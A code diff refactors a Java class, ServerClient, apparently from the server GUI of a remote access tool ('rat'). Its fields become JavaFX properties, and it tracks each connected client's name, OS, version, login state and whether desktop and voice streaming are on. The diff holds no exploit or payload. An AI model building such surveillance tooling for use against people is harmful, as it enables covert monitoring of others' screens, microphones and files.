@@ -1,14 +1,15 @@
 package de.sogomn.rat.server.gui;
 
+import javafx.beans.property.SimpleBooleanProperty;
+import javafx.beans.property.SimpleStringProperty;
 import de.sogomn.rat.ActiveClient;
 
 public final class ServerClient {
 	
-	private String name, os, version;
-	private boolean loggedIn;
+	private final SimpleStringProperty name, os, version;
+	private final SimpleBooleanProperty streamingDesktop, streamingVoice;
 	
-	private boolean streamingDesktop;
-	private boolean streamingVoice;
+	private boolean loggedIn;
 	
 	private DisplayPanel displayPanel;
 	private FileTreePanel treePanel;
@@ -18,14 +19,20 @@ public final class ServerClient {
 	public ServerClient(final ActiveClient client) {
 		this.client = client;
 		
+		name = new SimpleStringProperty();
+		os = new SimpleStringProperty();
+		version = new SimpleStringProperty();
+		streamingDesktop = new SimpleBooleanProperty();
+		streamingVoice = new SimpleBooleanProperty();
+		
 		displayPanel = new DisplayPanel();
 		treePanel = new FileTreePanel();
 	}
 	
 	public void logIn(final String name, final String os, final String version) {
-		this.name = name;
-		this.os = os;
-		this.version = version;
+		this.name.set(name);
+		this.os.set(os);
+		this.version.set(version);
 		
 		loggedIn = true;
 		
@@ -34,11 +41,11 @@ public final class ServerClient {
 	}
 	
 	public void setStreamingDesktop(final boolean streamingDesktop) {
-		this.streamingDesktop = streamingDesktop;
+		this.streamingDesktop.set(streamingDesktop);
 	}
 	
 	public void setStreamingVoice(final boolean streamingVoice) {
-		this.streamingVoice = streamingVoice;
+		this.streamingVoice.set(streamingVoice);
 	}
 	
 	public void setController(final IGuiController controller) {
@@ -47,7 +54,7 @@ public final class ServerClient {
 	}
 	
 	public String getName() {
-		return name;
+		return name.get();
 	}
 	
 	public String getAddress() {
@@ -55,11 +62,11 @@ public final class ServerClient {
 	}
 	
 	public String getOs() {
-		return os;
+		return os.get();
 	}
 	
 	public String getVersion() {
-		return version;
+		return version.get();
 	}
 	
 	public boolean isLoggedIn() {
@@ -67,11 +74,11 @@ public final class ServerClient {
 	}
 	
 	public boolean isStreamingDesktop() {
-		return streamingDesktop;
+		return streamingDesktop.get();
 	}
 	
 	public boolean isStreamingVoice() {
-		return streamingVoice;
+		return streamingVoice.get();
 	}
 	
 	public DisplayPanel getDisplayPanel() {
